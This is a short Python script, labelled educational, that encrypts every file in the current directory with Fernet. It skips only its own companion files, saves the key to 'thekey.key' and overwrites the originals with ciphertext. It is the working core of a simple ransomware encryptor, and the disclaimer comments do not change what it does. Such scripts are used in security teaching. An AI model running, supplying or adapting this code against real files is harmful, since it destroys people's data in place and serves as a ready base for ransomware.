import os
from cryptography.fernet import Fernet

# This is an educational encryption script. It demonstrates basic file encryption for cybersecurity learning.
# Use this responsibly and do not deploy it on systems without explicit permission.

files = []

# Find all files except encryption scripts and key
for file in os.listdir():
    if file in ('encrypt.py', 'decrypt.py', 'thekey.key', 'README.md', '.gitignore', 'requirements.txt'):
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate and save the encryption key
key = Fernet.generate_key()

with open('thekey.key', 'wb') as thekey:
    thekey.write(key)

# Encrypt each file
for file in files:
    with open(file, 'rb') as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as f:
        f.write(contents_encrypted)

print("Your files have been encrypted for educational purposes. Use the decryption script with the correct key to restore them.")
